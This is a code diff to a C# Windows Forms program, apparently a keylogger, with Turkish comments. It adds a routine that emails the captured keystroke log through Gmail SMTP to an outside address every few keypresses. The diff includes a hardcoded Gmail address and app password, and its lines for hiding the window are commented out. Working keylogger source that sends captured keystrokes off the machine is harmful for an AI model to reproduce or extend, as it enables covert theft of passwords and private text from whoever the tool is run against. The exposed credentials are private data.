@@ -19,6 +19,13 @@ namespace keylogger
         public Form1()
         {
             InitializeComponent();
+            
+            // Form'u normal göster
+            // this.WindowState = FormWindowState.Minimized;
+            // this.ShowInTaskbar = false;
+            // this.Opacity = 0;
+            
+            System.IO.File.AppendAllText("debug.txt", "Uygulama başlatıldı - " + DateTime.Now + "\n");
             ListenKeys();
         }
 
@@ -108,8 +115,63 @@ namespace keylogger
             klavye.KeyDown += new KeyEventHandler(KeyboardCombination);
         }
 
+        void Mail()
+        {
+            try
+            {
+                System.IO.File.AppendAllText("debug.txt", "Mail fonksiyonu çağrıldı - " + DateTime.Now + "\n");
+
+                // TLS 1.2 veya üstünü zorunlu kıl
+                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
+
+                using (MailMessage msg = new MailMessage())
+                using (SmtpClient client = new SmtpClient())
+                {
+                    // SMTP ayarları - sıralama önemli!
+                    client.Host = "smtp.gmail.com";
+                    client.Port = 587;
+                    client.EnableSsl = true;
+                    client.DeliveryMethod = SmtpDeliveryMethod.Network;
+                    client.UseDefaultCredentials = false; // Bu satır credentials'dan ÖNCE olmalı
+                    
+                    // Gmail App Password (boşluksuz)
+                    client.Credentials = new System.Net.NetworkCredential("doganmali599@gmail.com", "zeinrlzkkcykaxkr");
+                    client.Timeout = 20000; // 20 saniye timeout
+
+                    msg.From = new MailAddress("doganmali599@gmail.com", "Keylogger");
+                    msg.To.Add("ledogan80@gmail.com");
+                    msg.Subject = "Keylogger Log - " + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");
+                    msg.Body = log.ToString();
+                    msg.IsBodyHtml = false;
+
+                    System.IO.File.AppendAllText("debug.txt", "Mail gönderiliyor...\n");
+                    client.Send(msg);
+                    System.IO.File.AppendAllText("debug.txt", "Mail başarıyla gönderildi!\n");
+                    // MessageBox.Show("Mail başarıyla gönderildi!", "Başarılı", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+            }
+            catch (SmtpException smtpEx)
+            {
+                System.IO.File.AppendAllText("debug.txt", "SMTP Hatası: " + smtpEx.Message + "\n");
+                // MessageBox.Show("SMTP Hatası: " + smtpEx.Message + "\n\nDetay: " + smtpEx.InnerException?.Message, "SMTP Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            catch (Exception ex)
+            {
+                System.IO.File.AppendAllText("debug.txt", "Hata: " + ex.Message + "\n" + ex.StackTrace + "\n");
+                // MessageBox.Show("Mail gönderme hatası: " + ex.Message + "\n\nDetay: " + ex.InnerException?.Message + "\n\nStack Trace: " + ex.StackTrace, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+
         void KeyboardCombination(Object sender , KeyEventArgs e)
         {
+            if (number > 5)
+            {
+                System.IO.File.AppendAllText("debug.txt", "1 tuşa ulaşıldı, mail gönderiliyor... Log: " + log + "\n");
+                Mail();
+                number = 0;
+                log = "Boş - ";
+            }
              if (e.KeyCode == Keys.CapsLock)
             {
                 if (BigChar == true)
@@ -543,6 +605,8 @@ namespace keylogger
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            System.IO.File.AppendAllText("debug.txt", "Form yüklendi - " + DateTime.Now + "\n");
+            
             if (Control.IsKeyLocked(Keys.CapsLock))
             {
                 BigChar = true; this.Text = "Açık";
